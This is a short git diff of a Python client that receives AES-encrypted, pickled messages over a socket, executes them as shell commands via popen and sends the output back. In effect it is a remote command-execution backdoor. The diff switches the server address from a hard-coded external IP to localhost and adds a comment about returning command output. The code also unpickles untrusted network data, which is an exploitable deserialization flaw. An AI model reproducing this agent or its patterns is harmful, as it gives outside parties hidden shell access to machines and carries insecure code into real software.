@@ -13,7 +13,7 @@ from Crypto.Cipher import AES
 socket = socket.socket()
 HVA = '145.109.148.241'
 l = 'localhost'
-serverAddress = HVA, 1111
+serverAddress = l, 1111
 
 global key
 key = []
@@ -49,6 +49,7 @@ def send(socket, payload):
 def receive(socket):
     try:
         message = decryptAES(pickle.loads(socket.recv(2048)), key) #deserialize --> decrypt
+        # ||||| SHOULD SEND {COMMAND : OUTPUT}
         send(socket, popenExecution(message)) # --> execute 
         print(message) #show what you got || SAFE TO REMOVE
 
